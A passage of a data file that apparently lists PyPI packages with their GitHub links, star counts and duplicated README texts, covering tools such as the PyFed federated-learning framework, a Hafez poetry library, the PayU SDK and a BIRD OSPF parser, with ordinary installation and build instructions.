    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_2.npy"")
    target = np.load(""./target_client_2.npy"")

    client2 = FL_Client(""client_2"", data, target)

    client2.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_3.py
    from pyfed import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_3.npy"")
    target = np.load(""./target_client_3.npy"")

    client3 = FL_Client(""client_3"", data, target)

    client3.train(epochs, batch_size, lr, loss, optimizer, metrics)

Now, run each file separatly to get federated learning!


","# PyFed

PyFed is an open-source framework for federated learning algorithms. Federated Learning is a subfield of machine learning which trains a global model using one server and multiple clients which contain their separate datasets. 
This approach helps clients with the problems of sharing their local data with a server and the risk of data leakage. PyFed is a straightforward and brief package that allows scientists to try Federated Learning for any model using any dataset. Furthermore, PyFed uses Tensorboard to demonstrate the history of training of each client per round.

PyFed implements FL using sockets, processes, and threads. Simply put, each client will run its particular process and tries to establish a socket connection with the server, which also has its specific process. 
Once initiated, each connection will be handled by one thread of the server's process. Each thread will communicate with its respective client to receive the trained weights per round. 
Once they receive the result of one round, threads will return the weights to the server's process, which will arrive at a new model using the mentioned weights. The server will send the new model to the clients using newly initiated threads.
 
PyFed is mainly based on two classes:
 
- __FL_Server__: which represents the server to which clients communicate in a federated learning problem. The __train()__ function of this class handles socket connections and the FL policy. 
- __FL_Client__: which represents each client in a federated learning network. An object of this class handles training procedure any global model on any local data.

Currently, PyFed is limited to FedAvg as its only federated learning policy; however, we will introduce a broader range of configurations for FL experiments in the coming versions.

# Features
PyFed contains two critical classes: FL_Server and FL_Client, which are responsible for server and client actions in a federated learning problem, respectively. 
* __FL_Server.train()__ establishes a socket connections with clients and handles weight averaging. In addition, at the end of all rounds a tensorboard session will be started to reveal the efficancy of each client.
* __FL_Server.test()__ will test the final model on the given test data.
* __FL_Client.train()__ will initiate a training session for the client who runs the command. Each client will train the received model on its local dataset.

# Usage
Utilizing PyFed is effortless and time efficient. Following is an example of using this package for the mnist dataset.
# data.py
This is for distributing data among clients and a server.

    import numpy as np
    from sklearn.datasets import fetch_openml

    num_clients = 3
    mnist = fetch_openml(""mnist_784"", version=1)
    X, y = np.array(mnist[""data""]), np.array(mnist[""target""], dtype='int16')
    data_count = len(y) // (num_clients + 1)

    for i in range(num_clients):
        client_i_X, client_i_y = X[data_count*i:data_count*(i + 1)], y[data_count*i:data_count*(i + 1)]
        np.save(f""./data_client_{i+1}.npy"", client_i_X)
        np.save(f""./target_client_{i+1}.npy"", client_i_y)

    server_i_X, server_i_y = X[data_count*num_clients:], y[data_count*num_clients:]
    np.save(f""./data_server.npy"", server_i_X)
    np.save(f""./target_server.npy"", server_i_y)


## server.py
    from pyfed import FL_Server
    import numpy as np
    import tensorflow as tf


    model = tf.keras.models.Sequential()
    model.add(tf.keras.layers.InputLayer((784,)))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(2000, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(10, activation='softmax'))


    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    lr = 3e-4
    num_clients = 3
    rounds = 2


    model.compile(loss=loss,
                optimizer=optimizer(lr),
                metrics=metrics)

    data = np.load(""./data_server.npy"")
    target = np.load(""./target_server.npy"")


    server = FL_Server(model, num_clients, rounds)
    server.train()
    server.test(data, target, loss, optimizer, lr, metrics)

## client_1.py
    from pyfed import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_1.npy"")
    target = np.load(""./target_client_1.npy"")

    client1 = FL_Client(""client_1"", data, target)

    client1.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_2.py
    from pyfed import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_2.npy"")
    target = np.load(""./target_client_2.npy"")

    client2 = FL_Client(""client_2"", data, target)

    client2.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_3.py
    from pyfed import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_3.npy"")
    target = np.load(""./target_client_3.npy"")

    client3 = FL_Client(""client_3"", data, target)

    client3.train(epochs, batch_size, lr, loss, optimizer, metrics)

Now, run each file separatly to get federated learning!


",amirrezasokhankhosh/pyfed
geocam,https://github.com/sas229/geocam,1,73,73,"# geocam
Camera control software for geotechnical research applications.
","# geocam
Camera control software for geotechnical research applications.
",sas229/geocam
gptop,https://github.com/ncrews35/gpt-operator,27,2185,2024,"<div align=""center"">
  <img  src=""https://user-images.githubusercontent.com/33267791/233712514-b47aabb4-1821-4f67-8214-33d6fe2d6402.png"" alt=""GPTOP Logo"" />
</div>

# GPT Operator

[![PyPI version](https://badge.fury.io/py/gptop.svg)](https://badge.fury.io/py/gptop)

**Enhance your GPT applications with external operations**

GPT Operator (`gptop`) serves as a [call operator](https://en.wikipedia.org/wiki/Operator_assistance) for your application. Simply provide `gptop` with a prompt, and it will determine the required external operation to fulfill the prompt and, if desired, execute that operation on your behalf.

## Features

* Execute operations based on a given prompt
* Create, update, and remove operations in vector database

## Requirements

* Pinecone Vector Database Index
* OpenAI access to gpt-4

## Installation

Install the released version via pip:

```bash
$ pip install gptop
```

[WARNING] The package is currently in Alpha stage, so please exercise caution before using it in production.

## Repository Setup

If you don’t have Python installed, [download it here](https://www.python.org/downloads/).

1. Clone this repository.

2. Navigate to the project directory:

   ```bash
   $ cd gpt-operator
   ```

3. Create a new virtual environment:

   ```bash
   $ virtualenv virt
   $ source virt/bin/activate
   ```

4. Install the requirements:

   ```bash
   $ pip install -r requirements.txt
   ```

5. Make a copy of the example environment variables file:

   ```bash
   $ cp .env.example .env
   ```

6. Add your [OpenAI API key](https://beta.openai.com/account/api-keys) to the newly created `.env` file.

7. Add your [Pinecone API key and Region](https://docs.pinecone.io/docs/quickstart) to the newly created `.env` file.

## CLI

1. Run the application:

    ```bash
    $ ./run.sh
    ```

To set up an operation on your machine, please see the [example](https://github.com/ncrews35/gpt-operator/tree/mainline/example).

## Contributing

We are actively looking for new contributors to help improve and expand the GPT Operator repository. All contributions are welcome! Please feel free to reach out for more information on how you can contribute.
","



# GPT Operator

[![PyPI version](https://badge.fury.io/py/gptop.svg)](https://badge.fury.io/py/gptop)

**Enhance your GPT applications with external operations**

GPT Operator (`gptop`) serves as a [call operator](https://en.wikipedia.org/wiki/Operator_assistance) for your application. Simply provide `gptop` with a prompt, and it will determine the required external operation to fulfill the prompt and, if desired, execute that operation on your behalf.

## Features

* Execute operations based on a given prompt
* Create, update, and remove operations in vector database

## Requirements

* Pinecone Vector Database Index
* OpenAI access to gpt-4

## Installation

Install the released version via pip:

```bash
$ pip install gptop
```

[WARNING] The package is currently in Alpha stage, so please exercise caution before using it in production.

## Repository Setup

If you don’t have Python installed, [download it here](https://www.python.org/downloads/).

1. Clone this repository.

2. Navigate to the project directory:

   ```bash
   $ cd gpt-operator
   ```

3. Create a new virtual environment:

   ```bash
   $ virtualenv virt
   $ source virt/bin/activate
   ```

4. Install the requirements:

   ```bash
   $ pip install -r requirements.txt
   ```

5. Make a copy of the example environment variables file:

   ```bash
   $ cp .env.example .env
   ```

6. Add your [OpenAI API key](https://beta.openai.com/account/api-keys) to the newly created `.env` file.

7. Add your [Pinecone API key and Region](https://docs.pinecone.io/docs/quickstart) to the newly created `.env` file.

## CLI

1. Run the application:

    ```bash
    $ ./run.sh
    ```

To set up an operation on your machine, please see the [example](https://github.com/ncrews35/gpt-operator/tree/mainline/example).

## Contributing

We are actively looking for new contributors to help improve and expand the GPT Operator repository. All contributions are welcome! Please feel free to reach out for more information on how you can contribute.
",ncrews35/gpt-operator
hafez,https://github.com/kavehbc/hafez,1,2559,2559,"# Divan Hafez Poems & Omen

This library gives you access to the Hafez Poems.
To get more information about this poet, you can check [https://en.wikipedia.org/wiki/Hafez](https://en.wikipedia.org/wiki/Hafez).

Poems can be accessed as following:

- By the number of poem,
- By searching a query,
- Random poem (known as Omen or `Fal` in Persian)

## Installation

This package can be installed:

- using `pip`:

```bash
pip install hafez
```

- using `Makefile` on a cloned/forked repo:

```bash
make install
```

- using `pip` on a cloned/forked repo:

```bash
pip install -e . --upgrade --upgrade-strategy only-if-needed
```

## Methods

- `hafez.total_poems()` -> `int`

It returns `int`, the total number of poems available in the package.

- `hafez.get_poem(poem_id: int)` -> `dict`

`poem_id` is a number between `1` and `hafez.total_poems()`.
It returns the poem in a dictionary format (see Poem Data Structure)

- `hafez.omen()` or `hafez.fal()` -> `dict`

It returns a random poem in a dictionary format (see Poem Data Structure)

- `hafez.search(qeury: str)` -> `list`

`query` is a string to search within the verses of the Divan Hafez
It returns a list of poems in a dictionary format (see Poem Data Structure)

## Poem's Data Structure

```json
{""id"": 1,
""poem"": [],
""interpretation"": """",
""mp3"": ""https://...""}
```

## Example

```python
# it returns the total number of poems
# returns: int
total_number_of_poems = hafez.total_poems()

# get a poem by ID
# returns: dict
poem_5 = hafez.get_poem(5)

# get a random poem - omen (fal)
# returns: dict
omen = hafez.omen()  # same as: hafez.fal()

# search within the verses of poems
# returns: list[dict]
search_result = hafez.search(""حافظ"")
```

## Database
The poems of Divan Hafez are extracted from an open-source database as below:

Source: [https://github.com/mahmoud-eskandari/HafezFaalDatabase](https://github.com/mahmoud-eskandari/HafezFaalDatabase)

## Vocal Audios
The vocal audio files are done by Ms. Modares Zadeh, and it is available below:  

Source: [https://avayemastan.deklame.net/hafez/](https://avayemastan.deklame.net/hafez/)

## Demo
You can access the demo version deployed on Streamlit server at:

[https://divan-hafez.streamlit.app/](https://divan-hafez.streamlit.app/)


## Developer(s)
Kaveh Bakhtiyari - [Website](http://bakhtiyari.com) | [Medium](https://medium.com/@bakhtiyari)
  | [LinkedIn](https://www.linkedin.com/in/bakhtiyari) | [Github](https://github.com/kavehbc)

## Contribution
Feel free to join the open-source community and contribute to this repository.
","# Divan Hafez Poems & Omen

This library gives you access to the Hafez Poems.
To get more information about this poet, you can check [https://en.wikipedia.org/wiki/Hafez](https://en.wikipedia.org/wiki/Hafez).

Poems can be accessed as following:

- By the number of poem,
- By searching a query,
- Random poem (known as Omen or `Fal` in Persian)

## Installation

This package can be installed:

- using `pip`:

```bash
pip install hafez
```

- using `Makefile` on a cloned/forked repo:

```bash
make install
```

- using `pip` on a cloned/forked repo:

```bash
pip install -e . --upgrade --upgrade-strategy only-if-needed
```

## Methods

- `hafez.total_poems()` -> `int`

It returns `int`, the total number of poems available in the package.

- `hafez.get_poem(poem_id: int)` -> `dict`

`poem_id` is a number between `1` and `hafez.total_poems()`.
It returns the poem in a dictionary format (see Poem Data Structure)

- `hafez.omen()` or `hafez.fal()` -> `dict`

It returns a random poem in a dictionary format (see Poem Data Structure)

- `hafez.search(qeury: str)` -> `list`

`query` is a string to search within the verses of the Divan Hafez
It returns a list of poems in a dictionary format (see Poem Data Structure)

## Poem's Data Structure

```json
{""id"": 1,
""poem"": [],
""interpretation"": """",
""mp3"": ""https://...""}
```

## Example

```python
# it returns the total number of poems
# returns: int
total_number_of_poems = hafez.total_poems()

# get a poem by ID
# returns: dict
poem_5 = hafez.get_poem(5)

# get a random poem - omen (fal)
# returns: dict
omen = hafez.omen()  # same as: hafez.fal()

# search within the verses of poems
# returns: list[dict]
search_result = hafez.search(""حافظ"")
```

## Database
The poems of Divan Hafez are extracted from an open-source database as below:

Source: [https://github.com/mahmoud-eskandari/HafezFaalDatabase](https://github.com/mahmoud-eskandari/HafezFaalDatabase)

## Vocal Audios
The vocal audio files are done by Ms. Modares Zadeh, and it is available below:  

Source: [https://avayemastan.deklame.net/hafez/](https://avayemastan.deklame.net/hafez/)

## Demo
You can access the demo version deployed on Streamlit server at:

[https://divan-hafez.streamlit.app/](https://divan-hafez.streamlit.app/)


## Developer(s)
Kaveh Bakhtiyari - [Website](http://bakhtiyari.com) | [Medium](https://medium.com/@bakhtiyari)
  | [LinkedIn](https://www.linkedin.com/in/bakhtiyari) | [Github](https://github.com/kavehbc)

## Contribution
Feel free to join the open-source community and contribute to this repository.
",kavehbc/hafez
payu-websdk,https://github.com/payu-india/web-sdk-python,1,1291,1275,"# PayU SDK for Python Apis
This API gives you the status of the transaction. PayU recommends this API to reconcile with PayUâ€™s database after you receive the response, where var1 is your transaction id.

## Features Supported
Following features are supported in the PayU Python web SDK:
- Create Payment Link.
- Verify transactions, check the transaction status, transaction details, or discount rate for a transaction
- Initiated refunds, cancel refund, check refund status.
- Retrieve settlement details which the bank has to settle you.
- Get information of the payment options, offers, recommendations, and downtime details.
- Check the customerâ€™s eligibility for EMI and get the EMI amount according to interest
- Pay by link
  To get started with PayU, visit our [Developer Guide](https://devguide.payu.in/low-code-web-sdk/getting-started-low-code-web-sdk/register-for-a-test-merchant-account/)
# Table of Contents
    
1. [Installation](#usage)
2. [Getting Started](#getting-started)
3. [Documentation for various Methods](#documentation-for-various-methods)
## Usage
```shell
pip install payu_websdk
```
## Getting Started


```shell

client = payu_websdk.payUClient(<KEY>,<SALT>,<ENV>) // Need to set merchant key,salt and env (""TEST""/""LIVE"")

```
","# PayU SDK for Python Apis
This API gives you the status of the transaction. PayU recommends this API to reconcile with PayUâ€™s database after you receive the response, where var1 is your transaction id.

## Features Supported
Following features are supported in the PayU Python web SDK:
- Create Payment Link.
- Verify transactions, check the transaction status, transaction details, or discount rate for a transaction
- Initiated refunds, cancel refund, check refund status.
- Retrieve settlement details which the bank has to settle you.
- Get information of the payment options, offers, recommendations, and downtime details.
- Check the customerâ€™s eligibility for EMI and get the EMI amount according to interest
- Pay by link
  To get started with PayU, visit our [Developer Guide](https://devguide.payu.in/low-code-web-sdk/getting-started-low-code-web-sdk/register-for-a-test-merchant-account/)
# Table of Contents
    
1. [Installation](#usage)
2. [Getting Started](#getting-started)
3. [Documentation for various Methods](#documentation-for-various-methods)
## Usage
```shell
pip install payu_websdk
```
## Getting Started


```shell

client = payu_websdk.payUClient(,,) // Need to set merchant key,salt and env (""TEST""/""LIVE"")

```
",payu-india/web-sdk-python
bird-ospf-link-db-parser,https://github.com/Andrew-Dickinson/bird-ospf-link-db-parser,9,4095,4095,"
# Bird OSFP Link Database Parser

Parses the output of the BIRD Routing Daemon's `birdc show ospf state` command into a machine-readable JSON string.

```sh
> birdc show ospf state | parse-bird-link-db - | jq | less
{
  ""areas"": {
    ""0.0.0.0"": {
      ""routers"": {
        ""10.68.29.50"": {
          ""links"": {
            ""router"": [
              {
                ""id"": ""10.69.7.31"",
                ""metric"": 10
              }
            ],
            ""stubnet"": [
              {
                ""id"": ""10.69.29.50/32"",
                ""metric"": 0
              },
              {
                ""id"": ""10.68.29.50/32"",
                ""metric"": 0
              }
            ],
            ""external"": [
              {
                ""id"": ""10.70.174.0/24"",
                ""metric"": 20
              }
            ]
          }
        },
        ""10.68.73.125"": {
          ""links"": {
            ""router"": [
              {
                ""id"": ""10.69.73.25"",
                ""metric"": 10
              },
              {
                ""id"": ""10.69.52.83"",
                ""metric"": 30
              },
              {
                ""id"": ""10.69.73.25"",
                ""metric"": 30
              }
            ],
            ""stubnet"": [
              {
                ""id"": ""10.69.73.125/32"",
                ""metric"": 0
              },
              {
                ""id"": ""10.68.73.125/32"",
                ""metric"": 0
              }
            ]
          }
        },
        ...
      }
    }
  }
}
```

## Output Format

The output format is detailed using [JSON Schema](https://json-schema.org/) in `src/bird_parser/output_schema.json`

## Usage

Pre-requisites: `python3` available via the shell

First, install the CLI via pip:
```shell
pip install bird-ospf-link-db-parser
```

then invoke the tool with the CLI command:
```shell
birdc show ospf state | parse-bird-link-db -
```

But you probably want to use `jq` and `less` to make this output a bit more manageable:
```shell
sudo apt update && sudo apt install jq less
birdc show ospf state | parse-bird-link-db - | jq | less
```

## Dev Setup

Pre-requisites: `python3` available via the shell

Setup by cloning, creating a virtual env, and installing the application
```sh
git clone https://github.com/Andrew-Dickinson/bird-ospf-link-db-parser
cd bird-ospf-link-db-parser
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

then invoke the tool with the CLI command:
```sh
birdc show ospf link state > parse-bird-link-db -
```

## Running the unit tests

Follow the instructions under ""Dev Setup"" above, to clone a local copy of this application and activate
the virtual environment. Then installing the test dependencies with:
```sh
pip install -e "".[test,dev]""
```

Finally, invoke the test suite using pytest:
```
pytest test/
```

## Building to PyPi

Follow the instructions above to clone a local copy of this application, activate
the virtual environment, and run the tests.

Then, build & upload the application with
```
rm -rf dist/*
python -m build .
twine upload dist/*
```

## License

Distributed under the MIT License. See `LICENSE.txt` for more information.

## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag ""enhancement"".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request


## Acknowledgments
 * [Best-README-Template](https://github.com/othneildrew/Best-README-Template/)
","
# Bird OSFP Link Database Parser

Parses the output of the BIRD Routing Daemon's `birdc show ospf state` command into a machine-readable JSON string.

```sh
> birdc show ospf state | parse-bird-link-db - | jq | less
{
  ""areas"": {
    ""0.0.0.0"": {
      ""routers"": {
        ""10.68.29.50"": {
          ""links"": {
            ""router"": [
              {
                ""id"": ""10.69.7.31"",
                ""metric"": 10
              }
            ],
            ""stubnet"": [
              {
                ""id"": ""10.69.29.50/32"",
                ""metric"": 0
              },
              {
                ""id"": ""10.68.29.50/32"",
                ""metric"": 0
              }
            ],
            ""external"": [
              {
                ""id"": ""10.70.174.0/24"",
                ""metric"": 20
              }
            ]
          }
        },
        ""10.68.73.125"": {
          ""links"": {
            ""router"": [
              {
                ""id"": ""10.69.73.25"",
                ""metric"": 10
              },
              {
                ""id"": ""10.69.52.83"",
                ""metric"": 30
              },
              {
                ""id"": ""10.69.73.25"",
                ""metric"": 30
              }
            ],
            ""stubnet"": [
              {
                ""id"": ""10.69.73.125/32"",
                ""metric"": 0
              },
              {
                ""id"": ""10.68.73.125/32"",
                ""metric"": 0
              }
            ]
          }
        },
        ...
      }
    }
  }
}
```

## Output Format

The output format is detailed using [JSON Schema](https://json-schema.org/) in `src/bird_parser/output_schema.json`

## Usage

Pre-requisites: `python3` available via the shell

First, install the CLI via pip:
```shell
pip install bird-ospf-link-db-parser
```

then invoke the tool with the CLI command:
```shell
birdc show ospf state | parse-bird-link-db -
```

But you probably want to use `jq` and `less` to make this output a bit more manageable:
```shell
sudo apt update && sudo apt install jq less
birdc show ospf state | parse-bird-link-db - | jq | less
```

## Dev Setup

Pre-requisites: `python3` available via the shell

Setup by cloning, creating a virtual env, and installing the application
```sh
git clone https://github.com/Andrew-Dickinson/bird-ospf-link-db-parser
cd bird-ospf-link-db-parser
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

then invoke the tool with the CLI command:
```sh
birdc show ospf link state > parse-bird-link-db -
```

## Running the unit tests

Follow the instructions under ""Dev Setup"" above, to clone a local copy of this application and activate
the virtual environment. Then installing the test dependencies with:
```sh
pip install -e "".[test,dev]""
```

Finally, invoke the test suite using pytest:
```
pytest test/
```

## Building to PyPi

Follow the instructions above to clone a local copy of this application, activate
the virtual environment, and run the tests.

Then, build & upload the application with
```
rm -rf dist/*
python -m build .
twine upload dist/*
```

## License

Distributed under the MIT License. See `LICENSE.txt` for more information.

## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag ""enhancement"".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request


## Acknowledgments
 * [Best-README-Template](https://github.com/othneildrew/Best-README-Template/)
",andrew-dickinson/bird-ospf-link-db-parser
sd212review,https://github.com/sd212usna/sd212review,0,801,801,"# sd212review
Simple Python module to tell you which unit to write review questions for SD212

# Usage

    from sd212review import whichunit

    # you can call it with a number
    whichunit(257863) # returns 2

    # or you can call it with a string
    whichunit('m264351') # returns 3

# Build instructions

Follow [this tutorial on packaging](https://packaging.python.org/en/latest/tutorials/packaging-projects/)
and [this quickstart for setuptools](https://setuptools.pypa.io/en/latest/userguide/quickstart.html).

Pip/conda/mamba packages needed:

    build twine

To test:

    python3 test.py

To build:

    python3 -m build

To publish on pypi (requires account setup and
[api token](https://test.pypi.org/manage/account/token/)):

    python3 -m twine upload --repository testpypi dist/*
","# sd212review
Simple Python module to tell you which unit to write review questions for SD212

# Usage

    from sd212review import whichunit

    # you can call it with a number
    whichunit(257863) # returns 2

    # or you can call it with a string
    whichunit('m264351') # returns 3

# Build instructions

Follow [this tutorial on packaging](https://packaging.python.org/en/latest/tutorials/packaging-projects/)
and [this quickstart for setuptools](https://setuptools.pypa.io/en/latest/userguide/quickstart.html).

Pip/conda/mamba packages needed:

    build twine

To test:

    python3 test.py

To build:

    python3 -m build

To publish on pypi (requires account setup and
[api token](https://test.pypi.org/manage/account/token/)):

    python3 -m twine upload --repository testpypi dist/*
",sd212usna/sd212review
epcrawler,https://github.com/dgsmiley18/epcrawler,0,1477,1477,"# Anime Episode Name Scraper

![GitHub stars](https://img.shields.io/github/stars/dgsmiley18/EpCrawler.svg?style=social&label=Star&maxAge=2592000)
![Python](https://img.shields.io/badge/python-v3.6+-blue.svg)
![License](https://img.shields.io/badge/license-GPLv3-blue.svg)

## **epcrawler** - get episode names from anidb

## 🎨 Table of Contents

- [Anime Episode Name Scraper](#anime-episode-name-scraper)
  - [**epcrawler** - get episode names from anidb](#epcrawler---get-episode-names-from-anidb)
  - [🎨 Table of Contents](#-table-of-contents)
  - [💾 Installation](#-installation)
  - [📙 Usage](#-usage)
  - [🖥️ Command line interface](#️-command-line-interface)

## 💾 Installation

The recommended installation method is using `pip`:

```bash
pip install epcrawler
```

Check the [command line](%EF%B8%8F-command-line-interface) section for supported commands.

## 📙 Usage

Copy the name of the anime and pass it to `epcrawler`.

You can use `--name` and `--output` command line argument to specify the anime name and output file respectively.


## 🖥️ Command line interface

Currently `epcrawler` supports these commands

```bash
usage: Episode Finder [-h] -n NAME [-o OUTPUT]

Find the episodes names from your favorite anime!

options:
  -h, --help            show this help message and exit
  -n NAME, --name NAME  specify the anime name
  -o OUTPUT, --output OUTPUT
                        specify the output file
```
","# Anime Episode Name Scraper

![GitHub stars](https://img.shields.io/github/stars/dgsmiley18/EpCrawler.svg?style=social&label=Star&maxAge=2592000)
![Python](https://img.shields.io/badge/python-v3.6+-blue.svg)
![License](https://img.shields.io/badge/license-GPLv3-blue.svg)

## **epcrawler** - get episode names from anidb

## 🎨 Table of Contents

- [Anime Episode Name Scraper](#anime-episode-name-scraper)
  - [**epcrawler** - get episode names from anidb](#epcrawler---get-episode-names-from-anidb)
  - [🎨 Table of Contents](#-table-of-contents)
  - [💾 Installation](#-installation)
  - [📙 Usage](#-usage)
  - [🖥️ Command line interface](#️-command-line-interface)

## 💾 Installation

The recommended installation method is using `pip`:

```bash
pip install epcrawler
```

Check the [command line](%EF%B8%8F-command-line-interface) section for supported commands.

## 📙 Usage

Copy the name of the anime and pass it to `epcrawler`.

You can use `--name` and `--output` command line argument to specify the anime name and output file respectively.


## 🖥️ Command line interface

Currently `epcrawler` supports these commands

```bash
usage: Episode Finder [-h] -n NAME [-o OUTPUT]

Find the episodes names from your favorite anime!

options:
  -h, --help            show this help message and exit
  -n NAME, --name NAME  specify the anime name
  -o OUTPUT, --output OUTPUT
                        specify the output file
```
",dgsmiley18/epcrawler
firebase-functions,https://github.com/firebase/firebase-functions-python,20,93,93,"The Firebase Functions Python SDK provides an SDK for defining Cloud Functions for Firebase.
","The Firebase Functions Python SDK provides an SDK for defining Cloud Functions for Firebase.
",firebase/firebase-functions-python
wintraceroute,https://github.com/NiRit100/WinTraceroute,4,0,0,,,nirit100/wintraceroute
pystools,https://github.com/devzhaohan/HMTools,4,92,92,"


项目地址： https://pypi.org/project/pystools/

### 安装
```
pip install --upgrade pystools
```

","


项目地址： https://pypi.org/project/pystools/

### 安装
```
pip install --upgrade pystools
```

",devzhaohan/hmtools
nlvcore,https://github.com/nielathome/nlv,3,31,31,"Log file viewing and analysis
","Log file viewing and analysis
",nielathome/nlv
rds-core,https://github.com/lais-huol/rds-cep-python,0,313,313,"É uma biblioteca pública em Python que condensa um conjunto de boas práticas para o desenvolvimento das aplicações que compõem a Rede da Dados em Saúde (RDS) RDS do Laboratório de Inovação Tecnológica em Saúde (LAIS) e dos parceiros que contam com o LAIS para fazer suas próprias RDS, a exemplo RDS-RN e RDS-ES.

","É uma biblioteca pública em Python que condensa um conjunto de boas práticas para o desenvolvimento das aplicações que compõem a Rede da Dados em Saúde (RDS) RDS do Laboratório de Inovação Tecnológica em Saúde (LAIS) e dos parceiros que contam com o LAIS para fazer suas próprias RDS, a exemplo RDS-RN e RDS-ES.

",lais-huol/rds-cep-python
voyagerpy,https://github.com/pmelsted/voyagerpy,9,4199,4199,"# VoyagerPy

This repo manages the VoyagerPy Python package, a Python implementation of the R package [Voyager](https://github.com/pachterlab/voyager)

## Installation

To install the latest release of VoyagerPy, you can install it via `pip`:

```pip install voyagerpy```

### Clone the repo
Clone this repo either using SSH:

```git clone git@github.com:pmelsted/voyagerpy.git```

or HTTPS:

```git clone https://github.com/pmelsted/voyagerpy.git```.

To get the bleeding edge version, change your branch to `dev` by running

```git checkout dev```

once inside the `voyagerpy` directory.

### Install using `pip`

To install VoyagerPy, run 

```pip install .```

Some users may experince problems with installing GeoPandas, which VoyagerPy depends on. We refer to the [GeoPandas installation page](https://geopandas.org/en/stable/getting_started.html) if this is the case.

## Structure of VoyagerPy

VoyagerPy uses [AnnData](https://anndata.readthedocs.io/) as its internal datastructure. An AnnData object, `adata`, holds the following attributes:

- `adata.X`: the main data matrix of size $N_{obs} \times N_{vars}$. It holds the count data for each observation and feature (e.g. barcodes x genes), which may have gone under some transformation. Data type may be a `scipy.sparse.csr_matrix`, `numpy.ndarray`, or `numpy.matrix`. This is yet to be set in stone.
- `adata.layers`: A dictionary-like data structure with the values being matrices of the same shape as `adata.X`. These can hold transformations of `adata.X`, such as log-normalized counts.
- `adata.obs`: A `pandas.DataFrame` object where the rows represent the barcodes, and the columns are features of the barcodes.
- `adata.obsp`: This is a dictionary-based object, where each value is a `pandas.DataFrame` of size $N_{obs}\times N_{obs}$, representing a pairwise metric on the observation. For instance, `adata.obsp[""distances""]` can hold the pairwise distances between the positions of origin for the barcodes. This can be handy to store graphs over the barcodes.
- `adata.obsm`: This is a dictionary-based object where each value is a `pandas.DataFrame` or `geopandas.GeoDataFrame`. The number of rows in these data frames must be $N_{obs}$. Example of data frames to be stored here:
	- `geometry`: a `geopandas.GeoDataFrame` where each column is of `geopandas.GeoSeries` or `pandas.Series`, used for plotting spatial objects, such as points or polygons. To use GeoPandas for plotting a column, it must be a `geopandas.GeoSeries`. These will represent the geometries of the barcodes.
	- `local_*`: a `pandas.DataFrame` which contains spatial results over features in `obs`. These can be e.g. local Moran's I, local spatial heteroscedasticity (LOSH) over some features `x, y, z`. The columns of `local_moran` and `local_losh` would then be `x, y, z`.
- `adata.var`: A `pandas.DataFrame` object where the rows represent the features from the columns of `X` (e.g. genes), and the columns are features of the genes (or whatever the columns of `X` represent).
- `adata.varp`, `adata.varm`: These are not used for the time being, but these objects can be used similarly to `adata.obsp` and `adata.obsm` but for feature (gene) data.

- `adata.uns`: This is a dictionary containing data that cannot be stored in the above objects:
	- `config`: These can contain config or metadata about this object. By using VoyagerPy to read the scRNA-seq data, this dictionary has the following items by default:
		- `""var_names"": ""gene_ids""`, meaning that the index of the variables (genes) are the standardized ENSG gene IDs.
		- `""secondary_var_names"": ""symbol""`, meaning that the column `""symbol""` in `adata.var` contains the symbol names for the genes.
	- `spatial`: This dictionary contains various spatial data, including:
		- `img`: a dictionary with key-values as resolution-image
		- `scale`: a dictionary describing the scales of the images.
		- `transform`: metadata that describes the transforms applied to the images (rotation, mirror) such that the originals can be recovered.
		- `local_results`: This is a dictionary which can contain Monte-Carlo simulations of spatial autocorrelation statistics, such as for local Moran statistics.","# VoyagerPy

This repo manages the VoyagerPy Python package, a Python implementation of the R package [Voyager](https://github.com/pachterlab/voyager)

## Installation

To install the latest release of VoyagerPy, you can install it via `pip`:

```pip install voyagerpy```

### Clone the repo
Clone this repo either using SSH:

```git clone git@github.com:pmelsted/voyagerpy.git```

or HTTPS:

```git clone https://github.com/pmelsted/voyagerpy.git```.

To get the bleeding edge version, change your branch to `dev` by running

```git checkout dev```

once inside the `voyagerpy` directory.

### Install using `pip`

To install VoyagerPy, run 

```pip install .```

